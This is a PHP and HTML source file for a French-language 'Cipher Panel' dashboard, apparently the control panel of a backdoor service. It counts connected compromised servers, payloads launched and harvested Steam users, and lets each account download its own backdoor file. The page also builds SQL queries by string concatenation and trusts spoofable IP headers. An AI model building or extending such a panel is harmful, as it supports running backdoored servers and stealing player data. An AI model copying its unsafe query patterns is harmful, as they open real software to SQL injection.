<?php
session_start();  
if(!isset($_SESSION["username"]))  
{  
      die(header("location:login.php"));  
} 
include "includes/eldb.php";
$ifban = "SELECT ban FROM users WHERE username = '".$_SESSION["username"]."'";
if($result = mysqli_query($db, $ifban)){
    if(mysqli_num_rows($result) > 0){
        while($row = mysqli_fetch_array($result)){
            if ($row["ban"] == 1){
                die(header("location:oops.php"));
            }
        }
    }
}

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}

$ifip = "SELECT ipvalidate FROM users WHERE username = '".$_SESSION["username"]."'";
if($result = mysqli_query($db, $ifip)){
    if(mysqli_num_rows($result) > 0){
        while($row = mysqli_fetch_array($result)){
            if ($row["ipvalidate"] != $ip){
                die(header("location:oh!.php"));
            }
        }
    }
}

?>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <link rel="apple-touch-icon" sizes="76x76" href="assets/img/apple-icon.png">
  <link rel="icon" type="image/png" href="assets/img/favicon.png">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <title>
    Cipher Panel - Dashboard
  </title>
  <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
  <!--     Fonts and icons     -->
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:400,700|Material+Icons" />
    <script src="https://kit.fontawesome.com/647923b639.js"></script>
  <!-- CSS Files -->
  <link href="assets/css/material-dashboard.css?v=2.1.0" rel="stylesheet" />
</head>

<body class="dark-edition">
  <div class="wrapper ">
<?php include "includes/side.php"; ?>
    <div class="main-panel">
      <!-- Navbar -->
      <?php include "includes/nav.php"; ?>
      <!-- End Navbar -->
      <div class="content">
        <div class="container-fluid">
          <div class="row">
            <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6">
              <div class="card card-stats">
                <div class="card-header card-header-warning card-header-icon">
                  <div class="card-icon">
                    <i class="fas fa-server"></i>
                  </div>
                  <p class="card-category">Serveurs connectés</p>
                  <h3 class="card-title">
                    <small><? 
                    $getuser = "SELECT * FROM users WHERE username = '".$_SESSION["username"]."'";
                    if($resultu = mysqli_query($db, $getuser)){
                        if(mysqli_num_rows($resultu) > 0){ 
                          while($rowuser = mysqli_fetch_array($resultu)){
                    $count = 0;
                    if ($rowuser["rank"] == 1){
                    $countservon = "SELECT lupdate FROM servers WHERE token = '".$rowuser["token"]."'";
                  }else{
                    $countservon = "SELECT lupdate FROM servers";
                  }
                      if($result = mysqli_query($db, $countservon)){
                        if(mysqli_num_rows($result) > 0){
                          while($row = mysqli_fetch_array($result)){
                            if ($row["lupdate"] + 60 > time()){
                              $count = $count + 1;
                            }
                          }
                        }
                      }else{echo "Erreur";
                    }
                     echo $count; ?></small>
                  </h3>
                </div>
                <div class="card-footer">
                  <div class="stats">
                    <? if ($count < 5){ ?>
                    <i class="material-icons text-warning">warning</i>
                    <a class="warning-link">C'est très peu :(</a>
                  <? }else{ ?>
                    <a class="success-link">:)</a>
                  <? } ?>
                  </div>
                </div>
              </div>
            </div>
            <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6">
              <div class="card card-stats">
                <div class="card-header card-header-success card-header-icon">
                  <div class="card-icon">
                    <i class="fas fa-hdd"></i>
                  </div>
                  <p class="card-category">Serveurs enregistrés</p>

                  <h3 class="card-title"><?
                  if ($rowuser["rank"] == 1){
                  $countserven = $db->query("SELECT * FROM servers WHERE token = '".$rowuser["token"]."'"); 
                  }else{
                    $countserven = $db->query("SELECT * FROM servers"); }
                  $finalc = $countserven->num_rows;
                  echo $finalc;
                  ?></h3>
                </div>
                <div class="card-footer">
                  <div class="stats">
                    <i class="material-icons">date_range</i> Dont <? $dont = $finalc - $count;
                    echo $dont;
                    ?> serveurs hors-ligne
                  </div>
                </div>
              </div>
            </div>
            <?php   
                }
                }
              } ?>
            <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6">
              <div class="card card-stats">
                <div class="card-header card-header-danger card-header-icon">
                  <div class="card-icon">
                    <i class="fas fa-rocket"></i>
                  </div>
                  <p class="card-category">Payloads lancés</p>
                  <h3 class="card-title"><? $countpay = "SELECT stat FROM stats WHERE name = 'payloads'"; 
                  if($resultqq = mysqli_query($db, $countpay)){
                        if(mysqli_num_rows($resultqq) > 0){
                          while($rowaa = mysqli_fetch_array($resultqq)){
                  echo $rowaa["stat"];
                    }
                }
            }
                  ?></h3>
                </div>
                <div class="card-footer">
                  <div class="stats">
                    <i class="fas fa-bomb"></i> FEU ! FEU ☭
                  </div>
                </div>
              </div>
            </div>
            <div class="col-xl-3 col-lg-6 col-md-6 col-sm-6">
              <div class="card card-stats">
                <div class="card-header card-header-info card-header-icon">
                  <div class="card-icon">
                    <i class="fas fa-user-secret"></i>
                  </div>
                  <p class="card-category">Utilisateurs récupérés</p>
                  <h3 class="card-title"><?$countmemb = $db->query("SELECT * FROM steamusers"); 
                  $finalm = $countmemb->num_rows;
                  echo $finalm;
                  ?></h3>
                </div>
                <div class="card-footer">
                  <div class="stats">
                    <i class="material-icons">update</i> Data mise à jour il y a un instant
                  </div>
                </div>
              </div>
            </div>
          </div>
          <div class="row">
            <div class="col-md-12">
              <div class="card">
                <div class="card-header card-header-primary">
                  <h4 class="card-title ">Backdoor</h4>
                  <p class="card-category"> Récupérez votre backdoor</p>
                </div>
                <div class="card-body">
                  <?php
                  $getuser = "SELECT * FROM users WHERE username = '".$_SESSION["username"]."'";
                    if($resultu = mysqli_query($db, $getuser)){
                        if(mysqli_num_rows($resultu) > 0){ 
                          while($rowuser = mysqli_fetch_array($resultu)){
                            if ($rowuser["backdoor"] == "0"){
                              ?>
                  <button class="btn btn-r pull-right"><i class="fas fa-download"></i>  Télécharger (INDISP.)</button>
                  <label>Nous sommes en train de préparer votre backdoor. Patientez.</label>
                <? }else{ ?>
                <a href="../secure_area/bd/<? echo $rowuser["backdoor"]; ?>" target="_blank">
                  <button class="btn btn-success pull-right"><i class="fas fa-download"></i>  Télécharger</button>
                </a>
              <? }
              }
              }
              }
               ?>
                </div>
          </div>
        </div>
      </div>
          </div>
        </div>
  
    </div>
  </div>
  <!--   Core JS Files   -->
  <script src="assets/js/core/jquery.min.js"></script>
  <script src="assets/js/core/popper.min.js"></script>
  <script src="assets/js/core/bootstrap-material-design.min.js"></script>
  <script src="https://unpkg.com/default-passive-events"></script>
  <script src="assets/js/plugins/perfect-scrollbar.jquery.min.js"></script>
  <!-- Place this tag in your head or just before your close body tag. -->
  <script async defer src="https://buttons.github.io/buttons.js"></script>
  <!--  Google Maps Plugin    -->
  <script src="https://maps.googleapis.com/maps/api/js?key=YOUR_KEY_HERE"></script>
  <!-- Chartist JS -->
  <script src="assets/js/plugins/chartist.min.js"></script>
  <!--  Notifications Plugin    -->
  <script src="assets/js/plugins/bootstrap-notify.js"></script>
  <!-- Control Center for Material Dashboard: parallax effects, scripts for the example pages etc -->
  <script src="assets/js/material-dashboard.js?v=2.1.0"></script>
  <!-- Material Dashboard DEMO methods, don't include it in your project! -->
  <script src="assets/demo/demo.js"></script>
  <script>
    $(document).ready(function() {
      $().ready(function() {
        $sidebar = $('.sidebar');

        $sidebar_img_container = $sidebar.find('.sidebar-background');

        $full_page = $('.full-page');

        $sidebar_responsive = $('body > .navbar-collapse');

        window_width = $(window).width();

        $('.fixed-plugin a').click(function(event) {
          // Alex if we click on switch, stop propagation of the event, so the dropdown will not be hide, otherwise we set the  section active
          if ($(this).hasClass('switch-trigger')) {
            if (event.stopPropagation) {
              event.stopPropagation();
            } else if (window.event) {
              window.event.cancelBubble = true;
            }
          }
        });

        $('.fixed-plugin .active-color span').click(function() {
          $full_page_background = $('.full-page-background');

          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data-color', new_color);
          }

          if ($full_page.length != 0) {
            $full_page.attr('filter-color', new_color);
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.attr('data-color', new_color);
          }
        });

        $('.fixed-plugin .background-color .badge').click(function() {
          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('background-color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data-background-color', new_color);
          }
        });

        $('.fixed-plugin .img-holder').click(function() {
          $full_page_background = $('.full-page-background');

          $(this).parent('li').siblings().removeClass('active');
          $(this).parent('li').addClass('active');


          var new_image = $(this).find("img").attr('src');

          if ($sidebar_img_container.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
            $sidebar_img_container.fadeOut('fast', function() {
              $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
              $sidebar_img_container.fadeIn('fast');
            });
          }

          if ($full_page_background.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
            var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

            $full_page_background.fadeOut('fast', function() {
              $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
              $full_page_background.fadeIn('fast');
            });
          }

          if ($('.switch-sidebar-image input:checked').length == 0) {
            var new_image = $('.fixed-plugin li.active .img-holder').find("img").attr('src');
            var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

            $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
            $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.css('background-image', 'url("' + new_image + '")');
          }
        });

        $('.switch-sidebar-image input').change(function() {
          $full_page_background = $('.full-page-background');

          $input = $(this);

          if ($input.is(':checked')) {
            if ($sidebar_img_container.length != 0) {
              $sidebar_img_container.fadeIn('fast');
              $sidebar.attr('data-image', '#');
            }

            if ($full_page_background.length != 0) {
              $full_page_background.fadeIn('fast');
              $full_page.attr('data-image', '#');
            }

            background_image = true;
          } else {
            if ($sidebar_img_container.length != 0) {
              $sidebar.removeAttr('data-image');
              $sidebar_img_container.fadeOut('fast');
            }

            if ($full_page_background.length != 0) {
              $full_page.removeAttr('data-image', '#');
              $full_page_background.fadeOut('fast');
            }

            background_image = false;
          }
        });

        $('.switch-sidebar-mini input').change(function() {
          $body = $('body');

          $input = $(this);

          if (md.misc.sidebar_mini_active == true) {
            $('body').removeClass('sidebar-mini');
            md.misc.sidebar_mini_active = false;

            $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar();

          } else {

            $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar('destroy');

            setTimeout(function() {
              $('body').addClass('sidebar-mini');

              md.misc.sidebar_mini_active = true;
            }, 300);
          }

          // we simulate the window Resize so the charts will get updated in realtime.
          var simulateWindowResize = setInterval(function() {
            window.dispatchEvent(new Event('resize'));
          }, 180);

          // we stop the simulation of Window Resize after the animations are completed
          setTimeout(function() {
            clearInterval(simulateWindowResize);
          }, 1000);

        });
      });
    });
  </script>
  <script>
    $(document).ready(function() {
      // Javascript method's body can be found in assets/js/demos.js
      md.initDashboardPageCharts();

    });
  </script>
</body>

</html>